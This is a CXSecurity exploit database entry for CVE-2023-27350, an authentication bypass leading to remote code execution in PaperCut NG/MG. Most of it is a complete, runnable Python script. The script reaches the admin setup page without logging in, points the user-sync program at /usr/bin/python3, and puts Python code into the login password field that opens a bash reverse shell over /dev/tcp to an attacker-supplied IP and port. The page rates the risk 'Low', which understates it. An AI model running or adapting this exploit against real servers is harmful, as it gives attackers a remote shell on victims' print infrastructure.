---
title: PaperCut NG/MG 22.0.4 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2023050058
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-25
fetch_date: 2025-10-04T11:36:44.042575
---

# PaperCut NG/MG 22.0.4 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PaperCut NG/MG 22.0.4 Remote Code Execution (RCE)** **2023.05.24**  Credit:  **[Mohin Paramasivam (Shad0wQu35t) and MaanVader](https://cxsecurity.com/author/Mohin%2BParamasivam%2B%28Shad0wQu35t%29%2Band%2BMaanVader/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-27350](https://cxsecurity.com/cveshow/CVE-2023-27350/ "Click to see CVE-2023-27350")**  CWE: **[CWE-284](https://cxsecurity.com/cwe/CWE-284 "CWE-284")** | |

# Exploit Title: PaperCut NG/MG 22.0.4 - Remote Code Execution (RCE)
# Date: 13 May 2023
# Exploit Author: Mohin Paramasivam (Shad0wQu35t) and MaanVader
# Vendor Homepage: https://www.papercut.com/
# Version: 8.0 or later
# Tested on: 22.0.4
# CVE: CVE-2023-27350
import requests
import argparse
Group\_payload = {
"service":"direct/1/OptionsUserSync/$OptionsUserSource.$Form",
"sp":"S0",
"Form0":"$Hidden,$Hidden$0,$Hidden$1,$PropertySelection,$Hidden$2,$Hidden$3,$Hidden$4,$Hidden$5,$Hidden$6,$Hidden$7,$Hidden$8,$Hidden$9,$Hidden$10,$Hidden$11,$Hidden$12,$Hidden$13,$Hidden$14,$TextField,$TextField$0,$RadioGroup,$Submit,$Checkbox$2,primaryCardIdLength,$Checkbox$3,secondaryCardIdLength,$Checkbox$5,$Hidden$15,$Hidden$16,$Hidden$17,$Hidden$18,$Hidden$19,$Hidden$20,$Hidden$21,$PropertySelection$4,$TextField$13,$Checkbox$6,$TextField$14,$TextField$15,$TextField$16,$RadioGroup$0,$Submit$1,$PropertySelection$5,$TextField$17,$PropertySelection$6,$TextField$18,primaryCardId2Length,$PropertySelection$7,$TextField$19,secondaryCardId2Length,$Checkbox$7,$TextField$20,$Checkbox$8,$Checkbox$9,$Checkbox$10,$Submit$2,$Submit$3,$Submit$4,$Submit$5",
"$Hidden":"Sf278fd737ffcaed6eb3d1f67c2ba5c6d",
"$Hidden$0":"F",
"$Hidden$1":"F",
"$Hidden$2":"OH4sIAAAAAAAAAJWQwUrDQBCGp60VBBUp4lWRnncRPIjSg4iHwrYNpBU8xXW7JitJdp1sis2hF5\_BlxBP-lw-gF50Y2Mp6MW5DTP\_fP8\_z2\_QzBDotSqI4UaiyC0xIg1JJnGihCQDY5VOs5HrfZ2jkMOpkVeHny8bD8VeHVa6sBYYVBqVnTLYCnhuIw91iDzxuI0stNgtn3Aa8zSkvkWVhies1MTc3mhMLBwzR6c\_dFrSaUWnf9LbXqV1h3aCfDFbwt7BDGr3CO3fwXKrYsK04LEq5Pg8zZPex26j87i-XQdwkn2NIeGGi0gSoZPE4Ulpnki3mpFS8N556r4eXBR1qDFoqj5P5BxoLKyejfzhoAcAYzNDOPrnZxfZoKrWt6nN8odzG6WB5aFjNk77l-YLeZfbs8sBAAA.",
"$Hidden$3":"F",
"$Hidden$4":"X",
"$Hidden$5":"X",
"$Hidden$6":"X",
"$Hidden$7":"X",
"$Hidden$8":"X",
"$Hidden$9":"X",
"$Hidden$10":"X",
"$Hidden$11":"X",
"$Hidden$12":"X",
"$Hidden$13":"F",
"$Hidden$14":"X",
"$Hidden$15":"F",
"$Hidden$16":"S",
"$Hidden$17":"S",
"$Hidden$18":"S",
"$Hidden$19":"S",
"$Hidden$20":"F",
"$Hidden$21":"SSTANDARD\_UNIX",
"$PropertySelection":"3,CUSTOM",
"$TextField":"/usr/bin/python3",
"$TextField$0":"/usr/bin/python3",
"$RadioGroup":"0",
"primaryCardIdLength":"8",
"secondaryCardIdLength":"8",
"$PropertySelection$4":"0,STANDARD\_UNIX",
"$TextField$13":"",
"$TextField$14":"",
"$TextField$15":"",
"$TextField$16":"",
"$RadioGroup$0":"0",
"$PropertySelection$5":"NONE",
"$TextField$17":"",
"$PropertySelection$6":"NONE",
"$TextField$18":"employeeNumber",
"primaryCardId2Length":"8",
"$PropertySelection$7":"NONE",
"$TextField$19":"",
"secondaryCardId2Length":"8",
"$TextField$20":"",
"$Submit$4":"Apply"
}
parser = argparse.ArgumentParser(description="Papercut RCE")
parser.add\_argument('--url',help='Url of the vunerable application example http://10.2.3.4:9191 dont need the trailing /')
parser.add\_argument('--ip',help='our rev shell ip')
parser.add\_argument('--port',help='our rev shell port')
args = parser.parse\_args()
url = args.url
ip = args.ip
port = args.port
passwd\_input = f"import os;os.system(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\")"
final\_payload = {
"service":"direct/1/Home/$Form$0",
"sp":"S0",
"Form0":"$Hidden$0,$Hidden$1,inputUsername,inputPassword,$PropertySelection$0,$Submit$0",
"$Hidden$0":"true",
"$Hidden$1":"X",
"inputUsername":"help",
"inputPassword":passwd\_input,
"$PropertySelection$0":"en",
"$Submit$0":"Log+in"
}
# create a session
session = requests.Session()
# visit the first URL to set up the session
setup\_url = url+"/app?service=page/SetupCompleted"
response = session.get(setup\_url)
response.raise\_for\_status() # check for any errors
# visit the second URL using the same session
dashboard\_url = url+"/app?service=page/Dashboard"
response = session.get(dashboard\_url)
response.raise\_for\_status() # check for any errors
# URL to change user group
user\_group\_change\_url = url+"/app"
response = session.post(user\_group\_change\_url,data=Group\_payload)
response.raise\_for\_status() # check for errors
# URL to gain RCE
rce\_url = url+"/app"
response = session.post(rce\_url,data=final\_payload)
response.raise\_for\_status() # Check for any errors
# print the response text
print(response.text)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050058)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top